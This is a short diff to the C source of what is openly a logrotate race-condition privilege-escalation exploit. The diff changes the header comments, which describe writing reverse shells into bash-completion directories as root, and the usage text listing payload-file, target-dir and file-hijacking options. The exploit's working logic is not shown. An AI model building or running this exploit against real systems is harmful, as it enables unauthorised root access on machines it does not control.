@@ -6,15 +6,11 @@
  *   - If logrotate is executed as root and the user is in control of the logfile path, it is possible to abuse a race-condition to write files in ANY directories.
  *   - An attacker could elevate his privileges by writing reverse-shells into 
  *     directories like "/etc/bash_completition.d/".
- *   - This vulnerability was found during a challenge at the 35c3 CTF 
- *     ( https://ctftime.org/event/718 )
- *   - A detailed description and a PoC of this challenge was written by the 
- *   - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
  *
  * [ Precondition for privilege escalation ]
  *   - Logrotate needs to be executed as root
  *   - The logpath needs to be in control of the attacker
- *   - any option(create,compress,copy,etc..) that creates a new file is set in the logrotate configuration. 
+ *   - Any option(create,compress,copy,etc..) that creates a new file is set in the logrotate configuration. 
  * 
  * [ Tested version ]
  *   - Debian GNU/Linux 9.5 (stretch)
@@ -73,13 +69,13 @@
 void usage(const char* progname)
 {
 	printf("usage: %s [OPTION...] <logfile>\n",progname);
-	printf("  %-3s %-25s %-30s\n","-h","--help","Print this help");
-	printf("  %-3s %-25s %-30s\n","-t","--targetdir <dir>","Abosulte path to the target directory");
-	printf("  %-3s %-25s %-30s\n","-p","--payloadfile <file>","File that contains the payload");
-	printf("  %-3s %-25s %-30s\n","-s","--sleep <sec>","Wait before writing the payload");
-	printf("  %-3s %-25s %-30s\n","-d","--debug","Print verbose debug messages");
-	printf("  %-3s %-25s %-30s\n","-c","--compress","Hijack compressed files instead of created logfiles");
-	printf("  %-3s %-25s %-30s\n","-o","--open","Use IN_OPEN instead of IN_MOVED_FROM");
+	printf("  %-3s %-22s %-30s\n","-h","--help","Print this help");
+	printf("  %-3s %-22s %-30s\n","-t","--targetdir <dir>","Abosulte path to the target directory");
+	printf("  %-3s %-22s %-30s\n","-p","--payloadfile <file>","File that contains the payload");
+	printf("  %-3s %-22s %-30s\n","-s","--sleep <sec>","Wait before writing the payload");
+	printf("  %-3s %-22s %-30s\n","-d","--debug","Print verbose debug messages");
+	printf("  %-3s %-22s %-30s\n","-c","--compress","Hijack compressed files instead of created logfiles");
+	printf("  %-3s %-22s %-30s\n","-o","--open","Use IN_OPEN instead of IN_MOVED_FROM");
 }
 
 int main(int argc, char* argv[] )
